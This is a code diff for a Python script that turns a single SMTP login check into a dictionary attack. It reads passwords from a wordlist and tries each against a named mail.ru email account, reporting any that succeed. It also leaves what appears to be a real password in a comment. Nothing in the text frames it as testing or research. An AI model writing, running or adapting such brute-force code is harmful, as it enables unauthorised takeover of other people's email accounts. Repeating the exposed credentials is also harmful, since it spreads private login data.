@@ -1,7 +1,11 @@
 from xsmtplib import SMTP
+import time
+
+file1 = open('wrd.txt', 'r') 
+Lines = file1.readlines() 
 
 login = "thusynov2020@mail.ru"
-password = ""
+#password = "5591980super"
 
 
 def check(log, passw):
@@ -14,8 +18,12 @@ def check(log, passw):
         print("Not Found!")
         server.quit()
         return
-    print("Found: " + passw)
+    print("***********\nFound: " + passw)
     server.quit()
 
 
-check(login, password)
+for password in Lines:
+    time.sleep(0.1)
+    check(login, password)
+
+#check(login, password)
